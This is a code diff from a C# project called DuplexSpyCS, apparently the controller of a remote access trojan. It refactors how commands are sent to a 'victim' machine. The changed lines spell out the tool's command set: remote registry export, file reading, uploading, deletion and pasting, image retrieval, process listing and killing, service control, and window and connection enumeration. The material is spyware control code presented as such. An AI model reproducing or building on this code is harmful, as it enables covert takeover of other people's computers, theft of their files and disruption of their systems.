@@ -533,7 +533,7 @@ namespace DuplexSpyCS
             if (sfd.ShowDialog() == DialogResult.OK)
             {
                 string path = (string)textBox2.Tag;
-                m_victim.encSend(2, 0, $@"reg|export|{clsCrypto.b64E2Str(path)}|{clsCrypto.b64E2Str(sfd.FileName)}");
+                m_victim.fnSendCommand($@"reg|export|{clsCrypto.b64E2Str(path)}|{clsCrypto.b64E2Str(sfd.FileName)}");
             }
         }
 
@@ -1113,7 +1113,7 @@ namespace DuplexSpyCS
                 if (objs.Length == 2 && objs[1] == "f")
                 {
                     string path = objs[0];
-                    m_victim.encSend(2, 0, $"file|read|" + clsCrypto.b64E2Str(path));
+                    m_victim.fnSendCommand($"file|read|" + clsCrypto.b64E2Str(path));
                 }
             }));
         }
@@ -1184,7 +1184,7 @@ namespace DuplexSpyCS
 
                         buffer = buffer[0..byte_reads];
                         string b64_data = Convert.ToBase64String(buffer);
-                        m_victim.encSend(2, 0, string.Join("|", new string[]
+                        m_victim.fnSendCommand(string.Join("|", new string[]
                         {
                             "file",
                             "uf",
@@ -1229,7 +1229,7 @@ namespace DuplexSpyCS
                 .Select(x => clsCrypto.b64E2Str(x)).ToArray()
                 );
 
-            m_victim.encSend(2, 0, "file|df|send|" + data);
+            m_victim.fnSendCommand("file|df|send|" + data);
         }
 
         /// <summary>
@@ -1267,7 +1267,7 @@ namespace DuplexSpyCS
                     Invoke(new Action(() => f.Show()));
                 }
 
-                m_victim.encSend(2, 0, "file|img|" + string.Join(",", filename.ToArray()));
+                m_victim.fnSendCommand("file|img|" + string.Join(",", filename.ToArray()));
             }).Start();
         }
 
@@ -1371,7 +1371,7 @@ namespace DuplexSpyCS
             if (dia == DialogResult.Yes)
             {
                 int thd_cnt = 10;
-                m_victim.encSend(2, 0, $"file|del|{thd_cnt}|{string.Join(",", folders)}|{string.Join(",", files)}");
+                m_victim.fnSendCommand($"file|del|{thd_cnt}|{string.Join(",", folders)}|{string.Join(",", files)}");
             }
         }
 
@@ -1488,7 +1488,7 @@ namespace DuplexSpyCS
             f.Text = @$"File Clipboard\\{m_victim.ID}";
             f.Show();
 
-            m_victim.encSend(2, 0, $"file|paste|{type}|{string.Join(",", folders)}|{string.Join(",", files)}|{clsCrypto.b64E2Str(textBox1.Tag.ToString())}");
+            m_victim.fnSendCommand($"file|paste|{type}|{string.Join(",", folders)}|{string.Join(",", files)}|{clsCrypto.b64E2Str(textBox1.Tag.ToString())}");
         }
 
         /// <summary>
@@ -1506,7 +1506,7 @@ namespace DuplexSpyCS
                 f_limit = -1;
 
             listView1.Items.Clear();
-            m_victim.encSend(2, 0, $"file|sd|{path}|{d_limit}|{f_limit}");
+            m_victim.fnSendCommand($"file|sd|{path}|{d_limit}|{f_limit}");
             toolStripStatusLabel2.Text = "Loading...";
         }
 
@@ -1658,7 +1658,7 @@ namespace DuplexSpyCS
             listView5.Items.Clear();
             treeView4.Nodes.Clear();
 
-            m_victim.encSend(2, 0, $"window|init");
+            m_victim.fnSendCommand($"window|init");
 
             toolStripStatusLabel6.Text = "Loading...";
         }
@@ -1750,7 +1750,7 @@ namespace DuplexSpyCS
             listView2.Items.Clear();
             treeView2.Nodes.Clear();
 
-            m_victim.encSend(2, 0, $"task|init|{clsCrypto.b64E2Str($"select {string.Join(",", dic_fields["task"])} from win32_process")}");
+            m_victim.fnSendCommand($"task|init|{clsCrypto.b64E2Str($"select {string.Join(",", dic_fields["task"])} from win32_process")}");
         }
         /// <summary>
         /// "TaskMgr" function initialization.
@@ -1833,7 +1833,7 @@ namespace DuplexSpyCS
             if (msg != DialogResult.Yes)
                 return;
 
-            m_victim.encSend(2, 0, "task|kill|" + string.Join(",", id_tasks));
+            m_victim.fnSendCommand("task|kill|" + string.Join(",", id_tasks));
         }
         /// <summary>
         /// Send kill and delete process command request with process id.
@@ -1841,7 +1841,7 @@ namespace DuplexSpyCS
         private void Task_SendKillAndDelete()
         {
             string[] id_tasks = listView2.SelectedItems.Cast<ListViewItem>().Select(x => x.SubItems[1].Text).ToArray();
-            m_victim.encSend(2, 0, "task|kd|" + string.Join(",", id_tasks));
+            m_victim.fnSendCommand("task|kd|" + string.Join(",", id_tasks));
         }
         /// <summary>
         /// Send start process command request.
@@ -1893,7 +1893,7 @@ namespace DuplexSpyCS
             listView3.Items.Clear();
             richTextBox1.Text = string.Empty;
 
-            m_victim.encSend(2, 0, $"serv|init|{clsCrypto.b64E2Str($"select {string.Join(",", dic_fields["serv"])} from win32_service")}");
+            m_victim.fnSendCommand($"serv|init|{clsCrypto.b64E2Str($"select {string.Join(",", dic_fields["serv"])} from win32_service")}");
         }
         /// <summary>
         /// "Service" function initialization.
@@ -1951,17 +1951,17 @@ namespace DuplexSpyCS
             //TRUE: START; FALSE: STOP
 
             string[] names = Serv_GetNames();
-            m_victim.encSend(2, 0, $"serv|control|{names}|{(start ? "Running" : "Stopped")}");
+            m_victim.fnSendCommand($"serv|control|{names}|{(start ? "Running" : "Stopped")}");
         }
         private void Serv_ReqPause()
         {
             string[] names = Serv_GetNames();
-            m_victim.encSend(2, 0, $"serv|control|{names}|Paused");
+            m_victim.fnSendCommand($"serv|control|{names}|Paused");
         }
         private void Serv_ReqRestart()
         {
             string[] names = Serv_GetNames();
-            m_victim.encSend(2, 0, $"serv|control|{names}|restart");
+            m_victim.fnSendCommand($"serv|control|{names}|restart");
         }
         private void Serv_RegexSearch(string szPattern)
         {
@@ -1991,7 +1991,7 @@ namespace DuplexSpyCS
 
         private void Conn_ReqInit()
         {
-            m_victim.encSend(2, 0, $"conn|init");
+            m_victim.fnSendCommand($"conn|init");
         }
         /// <summary>
         /// "Connection" function initalization.
@@ -2048,10 +2048,10 @@ namespace DuplexSpyCS
                 "user",
             };
 
-            m_victim.encSend(2, 0, $"file|init|{200}|{200}");
-            //m_victim.encSend(2, 0, $"task|init|{clsCrypto.b64E2Str($"select {string.Join(",", dic_fields["task"])} from win32_process")}");
+            m_victim.fnSendCommand($"file|init|{200}|{200}");
+            //m_victim.fnSendCommand($"task|init|{clsCrypto.b64E2Str($"select {string.Join(",", dic_fields["task"])} from win32_process")}");
             Task_ReqInit();
-            m_victim.encSend(2, 0, $"reg|init");
+            m_victim.fnSendCommand($"reg|init");
             Conn_ReqInit();
             Serv_ReqInit();
             Window_ReqInit();
@@ -2106,7 +2106,7 @@ namespace DuplexSpyCS
                 string[] s = node.FullPath.Split("\\");
                 string root = s[1];
                 string node_path = string.Join("\\", s[2..]);
-                m_victim.encSend(2, 0, $"reg|item|{root}|" + clsCrypto.b64E2Str(node_path));
+                m_victim.fnSendCommand($"reg|item|{root}|" + clsCrypto.b64E2Str(node_path));
             }
             catch (Exception ex)
             {
@@ -2122,7 +2122,7 @@ namespace DuplexSpyCS
                 string[] s = path.Split("\\");
                 string root = s[1];
                 path = string.Join("\\", s[2..]);
-                m_victim.encSend(2, 0, $"reg|goto|{root}|{clsCrypto.b64E2Str(path)}");
+                m_victim.fnSendCommand($"reg|goto|{root}|{clsCrypto.b64E2Str(path)}");
             }
         }
 
@@ -2166,7 +2166,7 @@ namespace DuplexSpyCS
                 .ToArray()
                 );
 
-            m_victim.encSend(2, 0, "file|img|" + files);
+            m_victim.fnSendCommand("file|img|" + files);
         }
 
         private void toolStripMenuItem2_Click(object sender, EventArgs e)
@@ -2565,35 +2565,35 @@ namespace DuplexSpyCS
         {
             string[] names = listView3.SelectedItems.Cast<ListViewItem>().Select(x => x.Text).ToArray();
             string b64Names = string.Join(",", names.Select(x => clsCrypto.b64E2Str(x)).ToArray());
-            m_victim.encSend(2, 0, $"serv|control|{b64Names}|Running");
+            m_victim.fnSendCommand($"serv|control|{b64Names}|Running");
         }
         //SERVICE - STOP
         private void toolStripMenuItem13_Click(object sender, EventArgs e)
         {
             string[] names = listView3.SelectedItems.Cast<ListViewItem>().Select(x => x.Text).ToArray();
             string b64Names = string.Join(",", names.Select(x => clsCrypto.b64E2Str(x)).ToArray());
-            m_victim.encSend(2, 0, $"serv|control|{b64Names}|Stopped");
+            m_victim.fnSendCommand($"serv|control|{b64Names}|Stopped");
         }
         //SERVICE - PAUSE
         private void toolStripMenuItem12_Click(object sender, EventArgs e)
         {
             string[] names = listView3.SelectedItems.Cast<ListViewItem>().Select(x => x.Text).ToArray();
             string b64Names = string.Join(",", names.Select(x => clsCrypto.b64E2Str(x)).ToArray());
-            m_victim.encSend(2, 0, $"serv|control|{b64Names}|Paused");
+            m_victim.fnSendCommand($"serv|control|{b64Names}|Paused");
         }
         //SERVICE - RESUME
         private void toolStripMenuItem31_Click(object sender, EventArgs e)
         {
             string[] names = listView3.SelectedItems.Cast<ListViewItem>().Select(x => x.Text).ToArray();
             string b64Names = string.Join(",", names.Select(x => clsCrypto.b64E2Str(x)).ToArray());
-            m_victim.encSend(2, 0, $"serv|control|{b64Names}|Running");
+            m_victim.fnSendCommand($"serv|control|{b64Names}|Running");
         }
         //SERVICE - RESTART
         private void toolStripMenuItem32_Click(object sender, EventArgs e)
         {
             string[] names = listView3.SelectedItems.Cast<ListViewItem>().Select(x => x.Text).ToArray();
             string b64Names = string.Join(",", names.Select(x => clsCrypto.b64E2Str(x)).ToArray());
-            m_victim.encSend(2, 0, $"serv|control|{b64Names}|restart");
+            m_victim.fnSendCommand($"serv|control|{b64Names}|restart");
         }
 
         private void treeView6_AfterSelect(object sender, TreeViewEventArgs e)
